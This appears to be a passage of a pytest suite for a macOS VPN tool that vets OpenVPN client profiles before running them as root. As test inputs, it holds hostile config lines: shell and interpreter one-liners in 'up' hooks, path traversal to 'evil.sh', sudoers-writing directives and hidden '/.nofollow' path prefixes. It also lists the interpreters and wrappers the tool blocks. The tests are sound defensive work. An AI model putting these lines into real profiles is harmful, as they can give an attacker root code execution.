    ("verify-x509-name a\\\\b name", ["a\\b", "name"]),
])
def test_the_escapes_both_parsers_agree_on_still_work(line, words):
    assert vpn_execution._ovpn_tokens(line)[1:] == words


def test_a_refused_backslash_is_called_a_backslash(tmp_path):
    # R5-P3-2: the message must name what is wrong.
    r = review("connect", profile_for(ovpn(tmp_path, "verify-x509-name my\\qname name\n")))
    assert _blocked(r, "backslash")
    assert not any("quote" in b for b in r.blockers), r.blockers
    r2 = review("connect", profile_for(ovpn(tmp_path, "script-security 2\nup \"/usr/bin/true \\\\q\"\n", "two")))
    assert _blocked(r2, "backslash")


# ── directives a client profile must not carry ──

@pytest.mark.parametrize("line", ["mode server", "server 10.8.0.0 255.255.255.0", "server-bridge",
                                  "tls-server", "server-ipv6 fd00::/64"])
def test_server_mode_is_a_blocker(tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, "client"), line


@pytest.mark.parametrize("line", ["genkey secret /etc/sudoers.d/x", "ifconfig-pool-persist /etc/x",
                                  "tls-export-cert /etc", "client-config-dir /etc",
                                  "auth-gen-token-secret /etc/x"])
def test_directives_that_make_root_write_files_are_blockers(tmp_path, line):
    # Security P2-1.
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, line.split()[0]), line


@pytest.mark.parametrize("value, ok", [("utun", True), ("utun3", True), ("utun123", True),
                                       ("/etc/sudoers", False), ("/dev/tun0", False),
                                       ("utun1234", False), ("tun0", False)])
def test_dev_node_is_only_a_utun_name(tmp_path, value, ok):
    # Security P2-1: any other dev-node makes root open that path read-write.
    r = review("connect", profile_for(ovpn(tmp_path, f"dev tun\ndev-node {value}\n")))
    assert r.allowed is ok, r.blockers
    if not ok:
        assert _blocked(r, "dev-node")


@pytest.mark.parametrize("value, ok", [("tun", True), ("tap", True), ("utun", True), ("tun0", True),
                                       ("utun12", True), ("../../Users/as/x", False),
                                       ("/etc/sudoers", False), ("tun1234", False), ("eth0", False)])
def test_dev_is_only_a_tunnel_device_name(tmp_path, value, ok):
    r = review("connect", profile_for(ovpn(tmp_path, f"dev {value}\n")))
    assert r.allowed is ok, r.blockers
    if not ok:
        assert _blocked(r, "'dev'")


# ── the openvpn program root runs ──

def test_the_review_names_the_openvpn_it_will_run(tmp_path, monkeypatch):
    # Security P3-1: the program is resolved once, shown, and in the fingerprint.
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary",
                        lambda: "/usr/local/sbin/openvpn")
    r = review("connect", profile_for(ovpn(tmp_path, "")))
    assert "/usr/local/sbin/openvpn --cd " in r.command
    assert r.program == "/usr/local/sbin/openvpn"
    import dataclasses
    assert dataclasses.replace(r, program="/opt/homebrew/sbin/openvpn").fingerprint() != r.fingerprint()


def test_an_openvpn_planted_after_confirmation_runs_nothing(tmp_path, monkeypatch):
    found = {"path": "/usr/local/sbin/openvpn"}
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary", lambda: found["path"])
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_running", lambda: False)
    p = profile_for(ovpn(tmp_path, ""))
    confirmed = review("connect", p)
    found["path"] = "/opt/homebrew/sbin/openvpn"          # earlier in the search order now
    runner = Recorder(output="")
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is False and runner.scripts == []


def test_root_is_given_the_reviewed_openvpn(tmp_path, monkeypatch):
    calls = {"n": 0}

    def binary():
        calls["n"] += 1                                    # reviews see one path, a later lookup another
        return "/usr/local/sbin/openvpn" if calls["n"] <= 2 else "/opt/homebrew/sbin/openvpn"
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary", binary)
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_running", lambda: False)
    p = profile_for(ovpn(tmp_path, ""))
    confirmed = review("connect", p)
    runner = Recorder(output="")
    outcome = run("connect", p, runner, confirmed)
    assert outcome.ran is True
    assert runner.scripts == [vpn_rootscript.openvpn_command(
        "up", config=p["config_path"], sha256=confirmed.config_sha256,
        openvpn="/usr/local/sbin/openvpn")]


def test_the_review_blocks_when_it_cannot_name_the_openvpn_it_would_run(tmp_path, monkeypatch):
    # Re-review R-P3-5: no second lookup decides "installed".
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary", lambda: None)
    r = review("connect", profile_for(ovpn(tmp_path, "")))
    assert _blocked(r, "openvpn client not found")


# ── hook programs: absolute, existing, root-owned, no system program or interpreter ──

@pytest.mark.parametrize("line", ["up /nonexistent-dir/x.sh", "plugin /nonexistent/p.so",
                                  "pkcs11-providers /nonexistent/p.so"])
def test_a_program_or_library_that_does_not_exist_is_a_blocker(tmp_path, line):
    # Security P1-2: a missing path is how a parse mismatch looks; it would fail anyway.
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert not r.allowed
    assert any("does not exist" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("key", ["dns-updown", "tls-crypt-v2-verify", "client-crresponse"])
def test_newer_program_directives_are_hooks_with_the_ownership_check(tmp_path, key):
    # Security P1-3.
    script = tmp_path / "evil.sh"
    script.write_text("#!/bin/sh\n")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\n{key} {script}\n")))
    assert f"{key}: {script}" in r.root_hooks
    assert any(str(script) in b and "not owned by root" in b for b in r.blockers), r.blockers


@pytest.mark.parametrize("value", ["disable", "force"])
def test_dns_updown_keywords_are_listed_but_not_blocked(tmp_path, value):
    r = review("connect", profile_for(ovpn(tmp_path, f"dns-updown {value}\n")))
    assert r.allowed, r.blockers
    assert f"dns-updown: {value}" in r.root_hooks


@pytest.mark.parametrize("hook", ["up ./run.sh", "up run.sh"])
def test_a_hook_that_runs_a_copied_file_is_refused_as_a_relative_program(tmp_path, hook):
    # Security P3-3: under --cd, a relative name in a hook is root's copy of a
    # file the review showed only by name. The port refuses any relative program.
    r = review("connect", profile_for(ovpn_files(
        tmp_path, f"askpass run.sh\nscript-security 2\n{hook}\n", {"run.sh": b"#!/bin/sh\nid\n"})))
    assert _blocked(r, "not an absolute path"), r.blockers


@pytest.mark.parametrize("hook, needle", [
    ('up "/bin/sh run.sh"', "system program"),
    ('up "/bin/sh ./sub/../run.sh"', "a relative path"),
    ('up "/usr/bin/env RUN.sh"', "system program"),
])
def test_a_copied_file_handed_to_a_system_program_is_refused(tmp_path, hook, needle):
    # The rest of the old P3-3 cases: the program is a system interpreter or
    # wrapper, and a relative path argument is refused on its own as well.
    r = review("connect", profile_for(ovpn_files(
        tmp_path, f"askpass run.sh\nscript-security 2\n{hook}\n", {"run.sh": b"#!/bin/sh\nid\n"})))
    assert _blocked(r, needle), r.blockers


def test_a_hook_with_ordinary_arguments_is_not_mistaken_for_a_copied_file(tmp_path):
    r = review("connect", profile_for(ovpn_files(
        tmp_path, 'askpass run.sh\nscript-security 2\nup "/usr/bin/true up"\n', {"run.sh": b"x"})))
    assert r.allowed, r.blockers


@pytest.mark.parametrize("line", [
    'up "/bin/sh ../../../../../../../../Users/as/evil.sh"',      # interpreter, relative escape
    'up "../../../../../../../../Users/as/evil.sh"',              # relative program
    'up evil.sh', "up ./evil.sh",
    'up "/usr/bin/env ../../x.sh"', "plugin ../../evil.dylib", "dns-updown ../../x.sh",
    'up "/bin/sh -c \'cd /Users/as && ./evil.sh\'"',             # inline shell code (R-P1-2)
    "up \"/bin/sh -c '. ~/x'\"", 'up "/usr/bin/env -S \'sh x.sh\'"',
    'up "/usr/bin/python3 -c \'import os\'"', 'up "/usr/bin/perl -e 1"',
    'up "/usr/bin/nohup /usr/bin/true"', "up ../cfg/x.sh", "up ../config.ovpn",
])
def test_an_openvpn_hook_must_name_a_program_directly_by_absolute_path(tmp_path, line):
    # Under --cd a relative name resolves inside root's copies, and '../' leaves
    # them; an interpreter or wrapper runs code the review cannot see. OpenVPN
    # hooks are a program and its arguments, not a shell line.
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert not r.allowed, line
    assert any("absolute path" in b or "interpreter or wrapper" in b for b in r.blockers), r.blockers


def test_a_root_owned_program_with_plain_arguments_is_still_accepted(tmp_path):
    r = review("connect", profile_for(ovpn(
        tmp_path, 'script-security 2\nup "/usr/bin/true --flag value"\nroute-up /usr/bin/true\n')))
    assert r.allowed, r.blockers


@pytest.mark.parametrize("line", [
    # case and case-fold spellings of interpreters (R5-P1-1)
    "up \"/bin/SH -c 'cd /Users/as && ./evil.sh'\"", "up \"/bin/Bash -c './x'\"", 'up "/BIN/SH -c x"',
    'up "/bin/ſh -c x"', "up \"/usr/bin/PERL -e 'exec q(../x)'\"", "up \"/usr/bin/Python3 -c 'import os'\"",
    "up \"/usr/bin/ENV -S 'sh x'\"",
    # versioned names and links
    "up \"/usr/bin/perl5.34 -e 1\"", 'up "/usr/bin/tclsh8.5 x"', 'up "/usr/bin/wish8.5 x"',
    "up \"/usr/bin/vim -es -c q\"",
    # system programs that run an argument
    'up "/usr/bin/arch -arm64 /usr/bin/true"', 'up "/usr/bin/caffeinate -i /usr/bin/true"',
    'up "/usr/bin/script -q /dev/null"', 'up "/usr/bin/lockf -t 0 /tmp/l /usr/bin/true"',
    'up "/usr/bin/xcrun x"', 'up "/usr/bin/find /tmp -maxdepth 0 -exec x {} +"',
    'up "/usr/sbin/chroot / x"', "up \"/usr/bin/sqlite3 :memory: .shell\"", 'up /usr/libexec/x',
])
def test_an_openvpn_hook_through_a_system_program_or_any_spelling_of_an_interpreter_is_a_blocker(
        tmp_path, line):
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert not r.allowed, line


@pytest.mark.parametrize("line", [
    'up "{prog} ../../../../../../../../Users/as/evil.sh"', 'up "{prog} -o ProxyCommand=../x h"',
    'up "{prog} ./x"', 'up "{prog} ~/x"', 'up "{prog} {user}"',
])
def test_a_path_argument_of_an_openvpn_hook_must_be_absolute_and_root_owned(tmp_path, monkeypatch, line):
    # R5-P1-1 point 3: any word that names a path is a path the program may run.
    prog, user = _root_program(tmp_path, monkeypatch)
    text = "script-security 2\n" + line.format(prog=prog, user=user) + "\n"
    r = review("connect", profile_for(ovpn(tmp_path, text)))
    assert not r.allowed, line
    ok = review("connect", profile_for(ovpn(tmp_path, f'script-security 2\nup "{prog} --verbose"\n', "ok")))
    assert ok.allowed, ok.blockers


@pytest.mark.parametrize("args", ['"../../../../../../../Users/as/evil.sh"', '"/bin/sh -c ./x"',
                                  '"/usr/bin/caffeinate -i x"', "{user}"])
def test_down_root_plugin_arguments_are_a_hook_command(tmp_path, monkeypatch, args):
    # R5-P2-1: down-root runs its arguments as a command, as root.
    module, user = _root_program(tmp_path, monkeypatch, "openvpn-plugin-down-root.so")
    r = review("connect", profile_for(ovpn(
        tmp_path, f"script-security 2\nplugin {module} {args.format(user=user)}\n")))
    assert not r.allowed, args
    assert not any(str(module) in b for b in r.blockers), r.blockers   # the arguments, not the module


def test_other_plugin_arguments_must_not_name_paths(tmp_path, monkeypatch):
    module, _user = _root_program(tmp_path, monkeypatch, "openvpn-plugin-auth-pam.so")
    bad = review("connect", profile_for(ovpn(tmp_path, f"plugin {module} ../../x\n")))
    good = review("connect", profile_for(ovpn(tmp_path, f"plugin {module} login\n", "ok")))
    assert not bad.allowed and good.allowed, (bad.blockers, good.blockers)


def test_an_interpreter_outside_the_system_folders_is_found_by_its_name(tmp_path, monkeypatch):
    # Only the identity rule catches this: not a system folder, root-owned.
    prog = tmp_path / "bin" / "Bash5.2"
    prog.parent.mkdir()
    prog.write_text("x")
    _root_owned_tree(monkeypatch, tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f'script-security 2\nup "{prog} -c true"\n')))
    assert _blocked(r, "interpreter or wrapper")
    assert not any("system program" in b for b in r.blockers)


def test_an_interpreter_behind_an_innocent_link_name_is_found(tmp_path, monkeypatch):
    real = tmp_path / "bin" / "python3"
    real.parent.mkdir()
    real.write_text("x")
    (tmp_path / "bin" / "vpn-hook").symlink_to(real)
    _root_owned_tree(monkeypatch, tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {tmp_path / 'bin' / 'vpn-hook'}\n")))
    assert _blocked(r, "interpreter or wrapper")


@pytest.mark.skipif(not os.path.exists("/usr/bin/say"), reason="macOS system program")
def test_a_system_program_that_is_not_an_interpreter_is_still_refused(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\nup /usr/bin/say\n")))
    assert _blocked(r, "system program")
    assert review("connect", profile_for(ovpn(tmp_path, "script-security 2\nup /usr/bin/true\n", "ok"))).allowed


def test_a_tilde_argument_without_a_slash_is_refused(tmp_path, monkeypatch):
    prog = tmp_path / "hook"
    prog.write_text("x")
    _root_owned_tree(monkeypatch, tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f'script-security 2\nup "{prog} ~evil"\n')))
    assert _blocked(r, "home directory")


@pytest.mark.parametrize("line, needle", [
    ("up \"/.vol/16777232/1152921500312607361 -c 'cd ~as;sh evil.sh'\"", "hidden macOS path"),
    ('up "/.nofollow/usr/bin/git -c alias.x=x x"', "hidden macOS path"),
    ("up /.nofollow/usr/bin/say", "hidden macOS path"),
    ("up \"/.resolve/1/bin/sh -c x\"", "hidden macOS path"),
    ('up "/usr/bin/true /.nofollow/Users/as/x"', "hidden macOS path"),
    ("plugin /.nofollow/opt/x/dr.so arg", "hidden macOS path"),
    # A data file is refused by the manifest's plain-path rule, with its own wording.
    ("ca /.resolve/1/Users/as/ca.crt", "hidden '/.' prefix"),
])
def test_a_hidden_macos_path_prefix_is_refused(tmp_path, line, needle):
    # R7-P1-1: /.vol, /.nofollow, /.resolve reach any file under another spelling.
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert _blocked(r, needle), (line, r.blockers)


def test_down_root_is_recognised_by_its_real_name(tmp_path, monkeypatch):
    real = tmp_path / "openvpn-plugin-down-root.so"
    real.write_text("x")
    (tmp_path / "dr.so").symlink_to(real)
    _root_owned_tree(monkeypatch, tmp_path)
    r = review("connect", profile_for(ovpn(
        tmp_path, f"script-security 2\nplugin {tmp_path / 'dr.so'} \"/bin/sh -c x\"\n")))
    assert _blocked(r, "system program") or _blocked(r, "interpreter or wrapper"), r.blockers


@pytest.mark.parametrize("program, system", [
    ("/Library/Developer/CommandLineTools/usr/bin/git", True), ("/USR/LIBEXEC/x", True),
    ("/usr/bin/../libexec/x", True), ("/bin/ſh", True), ("/opt/x/hook", False),
    ("/usr/local/bin/hook", False), ("/usr/bin/true", False),
])
def test_system_program_detection_by_location(program, system):
    # R7-P2-1, R7-P3-2: the location rule on its own, without the file existing.
    assert vpn_execution._system_program(program) is system


@pytest.mark.parametrize("line", ["up /USR/BIN/SAY", "up /usr/libexec/PlistBuddy",
                                  'up "/usr/bin/sandbox-exec -n x y"', 'up "/usr/bin/stdbuf -o0 y"',
                                  'up "/usr/bin/m4 y"', 'up "/usr/bin/su root"'])
def test_existing_system_programs_are_refused_as_system_programs(tmp_path, line):
    if not os.path.exists(line.split()[1].strip('"').lower()):
        pytest.skip("macOS system program")
    r = review("connect", profile_for(ovpn(tmp_path, "script-security 2\n" + line + "\n")))
    assert _blocked(r, "system program"), r.blockers


@pytest.mark.skipif(not os.path.exists("/usr/bin/say"), reason="macOS system program")
def test_a_link_outside_the_system_folders_to_a_system_program_is_refused(tmp_path, monkeypatch):
    (tmp_path / "hook").symlink_to("/usr/bin/say")
    _root_owned_tree(monkeypatch, tmp_path)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {tmp_path / 'hook'}\n")))
    assert _blocked(r, "system program")


def test_an_openvpn_argument_that_does_not_exist_is_refused(tmp_path):
    r = review("connect", profile_for(ovpn(
        tmp_path, 'script-security 2\nup "/usr/bin/true /Volumes/sentinel-none-a1b2/x"\n')))
    assert _blocked(r, "does not exist")


def test_an_openvpn_option_with_a_root_owned_value_is_accepted(tmp_path):
    if not os.path.exists("/etc/hosts"):
        pytest.skip("needs /etc/hosts")
    r = review("connect", profile_for(ovpn(tmp_path, 'script-security 2\nup "/usr/bin/true --conf=/etc/hosts"\n')))
    assert r.allowed, r.blockers


def test_dev_null_as_an_openvpn_argument_is_accepted(tmp_path):
    # /dev/null is world-writable by design; it is not a file anyone can plant code in.
    r = review("connect", profile_for(ovpn(tmp_path, 'script-security 2\nup "/usr/bin/true /dev/null"\n')))
    assert r.allowed, r.blockers


def test_an_openvpn_cidr_argument_is_not_a_path(tmp_path):
    r = review("connect", profile_for(ovpn(tmp_path, 'script-security 2\nup "/usr/bin/true 10.0.0.0/8 fd00::/64"\n')))
    assert r.allowed, r.blockers


# ── ownership along links, for hook programs and absolute data files ──

def _linked_tree(tmp_path, monkeypatch):
    """rootdir/link -> home/sub, where only `home` is user-owned (R-P3-2)."""
    home, rootdir = tmp_path / "home", tmp_path / "rootdir"
    (home / "sub").mkdir(parents=True)
    rootdir.mkdir()
    (home / "sub" / "prog").write_text("x")
    (rootdir / "link").symlink_to(home / "sub")

    def stat_(path, *a, **k):
        if str(path) == str(home):
            return types.SimpleNamespace(st_uid=501, st_mode=stat.S_IFDIR | 0o755)
        if not os.path.lexists(path) and str(path) != "/":
            raise FileNotFoundError(path)
        kind = stat.S_IFREG if os.path.isfile(path) else stat.S_IFDIR
        return types.SimpleNamespace(st_uid=0, st_mode=kind | 0o755)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    return home, rootdir


def test_ownership_is_checked_along_the_real_path_too(tmp_path, monkeypatch):
    home, rootdir = _linked_tree(tmp_path, monkeypatch)
    assert vpn_execution._unsafe_executable_reason(home / "sub" / "prog")       # direct: caught
    reason = vpn_execution._unsafe_executable_reason(rootdir / "link" / "prog")
    assert reason and str(home) in reason                                         # through the link


def test_an_absolute_data_file_behind_a_linked_folder_is_a_blocker(tmp_path, monkeypatch):
    home, rootdir = _linked_tree(tmp_path, monkeypatch)
    r = review("connect", profile_for(ovpn(tmp_path, f"ca {rootdir / 'link' / 'prog'}\n")))
    assert not r.allowed
    assert any(str(home) in b for b in r.blockers), r.blockers


def test_a_link_reached_through_a_second_link_is_checked(tmp_path, monkeypatch):
    # R5-P3-1: rootdir/l1 -> home/l2 -> rootdir2/sub; only `home` is user-owned.
    home, rootdir, rootdir2 = tmp_path / "home", tmp_path / "rootdir", tmp_path / "rootdir2"
    (rootdir2 / "sub").mkdir(parents=True)
    (rootdir2 / "sub" / "prog").write_text("x")
    home.mkdir()
    rootdir.mkdir()
    (home / "l2").symlink_to(rootdir2 / "sub")
    (rootdir / "l1").symlink_to(home / "l2")

    def stat_(path, *a, **k):
        if str(path) == str(home):
            return types.SimpleNamespace(st_uid=501, st_mode=stat.S_IFDIR | 0o755)
        if not os.path.lexists(path) and str(path) != "/":
            raise FileNotFoundError(path)
        kind = stat.S_IFREG if os.path.isfile(path) else stat.S_IFDIR
        return types.SimpleNamespace(st_uid=0, st_mode=kind | 0o755)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(rootdir / "l1" / "prog")
    assert reason and str(home) in reason


def test_a_user_folder_in_the_middle_of_a_link_chain_is_checked(tmp_path, monkeypatch):
    # rootdir/l1 -> rootdir3/l2 -> home/l3 -> rootdir2/sub: `home` is only on the third step.
    home, r1, r2, r3 = (tmp_path / n for n in ("home", "rootdir", "rootdir2", "rootdir3"))
    for d in (home, r1, r3, r2 / "sub"):
        d.mkdir(parents=True)
    (r2 / "sub" / "prog").write_text("x")
    (home / "l3").symlink_to(r2 / "sub")
    (r3 / "l2").symlink_to(home / "l3")
    (r1 / "l1").symlink_to(r3 / "l2")

    def stat_(path, *a, **k):
        if str(path) == str(home):
            return types.SimpleNamespace(st_uid=501, st_mode=stat.S_IFDIR | 0o755)
        if not os.path.lexists(path) and str(path) != "/":
            raise FileNotFoundError(path)
        kind = stat.S_IFREG if os.path.isfile(path) else stat.S_IFDIR
        return types.SimpleNamespace(st_uid=0, st_mode=kind | 0o755)
    monkeypatch.setattr(vpn_execution, "_stat", stat_)
    reason = vpn_execution._unsafe_executable_reason(r1 / "l1" / "prog")
    assert reason and str(home) in reason


def test_a_down_root_plugin_behind_a_link_hands_root_its_command_to_recheck(tmp_path):
    """Root re-checks the down-root command's program before start; the plugin is
    recognised by the name its link leads to, as the review does."""
    real = tmp_path / "openvpn-plugin-down-root.so"
    real.write_text("")
    link = tmp_path / "helper.so"
    link.symlink_to(real)
    text = f"client\nplugin {link} /usr/local/libexec/down.sh\n"
    assert vpn_execution._openvpn_programs(text) == [str(link), "/usr/local/libexec/down.sh"]
    assert vpn_execution._openvpn_programs(
        "client\nplugin /x/other-plugin.so /usr/local/libexec/arg\n") == ["/x/other-plugin.so"]


# ── closing the S8 port's mutation survivors ──

@pytest.mark.parametrize("line", ["daemon", "daemon myname", "syslog", "syslog vpn"])
def test_daemon_and_syslog_are_blockers(tmp_path, line):
    """Spec 1.3: both would take the start-up log the root script reads the
    tunnel device from (and `daemon` renames the process root later checks)."""
    r = review("connect", profile_for(ovpn(tmp_path, line + "\n")))
    assert _blocked(r, f"'{line.split()[0]}'"), r.blockers


def test_execute_hands_root_the_hook_programs_to_recheck(tmp_path, monkeypatch):
    monkeypatch.setattr(vpn_execution.openvpn_manager, "is_running", lambda: False)
    prog, _ = _root_program(tmp_path, monkeypatch, "up.sh")
    p = profile_for(ovpn(tmp_path, f"script-security 2\nup {prog}\n"))
    confirmed = review("connect", p)
    assert confirmed.allowed, confirmed.blockers
    assert confirmed.programs == (str(prog),)
    runner = Recorder(output="")
    assert run("connect", p, runner, confirmed).ran is True
    assert runner.scripts[0].endswith(f" 0 {prog}")       # no files, then the program


def test_the_hook_programs_are_in_the_fingerprint():
    base = vpn_execution.ExecutionReview("connect", "OpenVPN", "x", "/c.ovpn", "", "cmd",
                                         config_sha256="a" * 64)
    assert (vpn_execution.replace(base, programs=("/x/up.sh",)).fingerprint()
            != base.fingerprint())


def test_a_user_writable_openvpn_is_warned_about_not_blocked(tmp_path, monkeypatch):
    exe = tmp_path / "homebrew" / "openvpn"
    exe.parent.mkdir()
    exe.write_text("")
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary", lambda: str(exe))
    r = review("connect", profile_for(ovpn(tmp_path, "")))
    assert r.allowed, r.blockers
    assert any(w.startswith(f"openvpn runs as administrator from {exe}") and
               "protect the config and its files, not the tool" in w for w in r.warnings)


# ── S8 port: fixes after the independent code and security reviews ──

def test_a_root_only_absolute_file_is_checked_by_ownership_not_blocked(tmp_path, monkeypatch):
    """Code review P2-1: a key in /etc/openvpn readable only by root is the
    secure layout; root owns it all the way up, so root re-checks ownership."""
    key = tmp_path / "etc" / "client.key"
    key.parent.mkdir()
    key.write_text("secret")
    monkeypatch.setattr(vpn_execution, "_stat", lambda p, *a, **k: types.SimpleNamespace(
        st_uid=0, st_mode=stat.S_IFREG | 0o600))
    real_open = os.open

    def denied(path, *a, **k):
        if str(path) == str(key):
            raise PermissionError(13, "Permission denied", str(path))
        return real_open(path, *a, **k)
    monkeypatch.setattr(vpn_execution.os, "open", denied)
    r = review("connect", profile_for(ovpn(tmp_path, f"key {key}\n")))
    assert r.allowed, r.blockers
    assert r.includes == () and r.programs == (str(key),)
    assert any("can be read only by root" in w and str(key) in w for w in r.warnings)


def test_a_relative_file_root_only_can_read_still_blocks(tmp_path, monkeypatch):
    path = ovpn_files(tmp_path, "key k.key\n", {"k.key": b"K"})
    real_open = os.open
    monkeypatch.setattr(vpn_execution.os, "open", lambda p, *a, **k: (
        (_ for _ in ()).throw(PermissionError(13, "denied")) if str(p).endswith("k.key")
        else real_open(p, *a, **k)))
    r = review("connect", profile_for(path))
    assert _blocked(r, "cannot be read"), r.blockers


def test_an_openvpn_path_with_a_space_is_refused_at_review(tmp_path, monkeypatch):
    # Code review P3-3: root and the builder refuse it; say so before the prompt.
    monkeypatch.setattr(vpn_execution.openvpn_manager, "openvpn_binary",
                        lambda: "/Applications/My VPN/openvpn")
    r = review("connect", profile_for(ovpn(tmp_path, "")))
    assert _blocked(r, "a path with a space"), r.blockers


def test_a_line_longer_than_openvpns_buffer_is_a_blocker(tmp_path):
    """Security review P1-1: OpenVPN reads 256 bytes at a time, so a long line
    inside <ca> ends the block early and what follows becomes directives."""
    body = ("<ca>\n" + "A" * 255 + "</ca>\nscript-security 2\nup /Users/me/evil.sh\n"
            "MIIB\n</ca>\n")
    r = review("connect", profile_for(ovpn(tmp_path, body)))
    assert _blocked(r, "OpenVPN would read it as more than one line"), r.blockers
    ok = "<ca>\n" + "A" * (vpn_execution.OPENVPN_LINE_LIMIT - 1) + "\n</ca>\n"
    assert not _blocked(review("connect", profile_for(ovpn(tmp_path, ok, "ok"))),
                        "more than one line")
    wide = "remote vpn.example 1194 # " + "é" * 120 + "\n"            # bytes, not characters
    assert _blocked(review("connect", profile_for(ovpn(tmp_path, wide, "wide"))),
                    "more than one line")


def test_show_pkcs11_ids_is_a_blocker(tmp_path):
    # Security review P1-2: it loads its library while the config is read.
    r = review("connect", profile_for(ovpn(tmp_path, "show-pkcs11-ids /tmp/x.dylib\n")))
    assert _blocked(r, "'show-pkcs11-ids' can load a library"), r.blockers


def _script_with(tmp_path, monkeypatch, first_line):
    prog, _ = _root_program(tmp_path, monkeypatch, "up.sh")
    prog.write_text(first_line + "\nexit 0\n")
    return prog


@pytest.mark.parametrize("first_line, needle", [
    ("#!/nonexistent-interp/python3", "/nonexistent-interp/python3 does not exist"),
    ("#!/usr/bin/env nosuchinterpreter", "names no program"),
    ("#!python3", "names no program"),
    ("#!", "names no program"),
])
def test_a_hook_scripts_interpreter_must_be_root_owned(tmp_path, monkeypatch, first_line, needle):
    """Security review P2-1: a root-owned script is only as safe as its #! line."""
    prog = _script_with(tmp_path, monkeypatch, first_line)
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {prog}\n")))
    assert _blocked(r, needle), r.blockers


def test_a_user_owned_interpreter_is_refused(tmp_path, monkeypatch):
    prog = _script_with(tmp_path, monkeypatch, "#!/bin/sh")
    interp = tmp_path / "user" / "python3"                  # beside the user's evil.sh
    interp.write_text("")
    prog.write_text(f"#!{interp}\nexit 0\n")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {prog}\n")))
    assert _blocked(r, f"with {interp} as administrator"), r.blockers


@pytest.mark.parametrize("first_line, interpreter", [
    ("#!/bin/sh", "/bin/sh"), ("#! /bin/sh -e", "/bin/sh"),
    ("#!/usr/bin/env -S sh", "sh"), ("not a script", None),
])
def test_a_root_owned_interpreter_is_accepted_and_rechecked_by_root(tmp_path, monkeypatch,
                                                                    first_line, interpreter):
    prog = _script_with(tmp_path, monkeypatch, first_line)
    if interpreter == "sh":            # env looks it up in the system folders, in order
        interpreter = vpn_execution._which_privileged("sh")
    r = review("connect", profile_for(ovpn(tmp_path, f"script-security 2\nup {prog}\n")))
    assert r.allowed, r.blockers
    assert r.programs == ((str(prog), interpreter) if interpreter else (str(prog),))
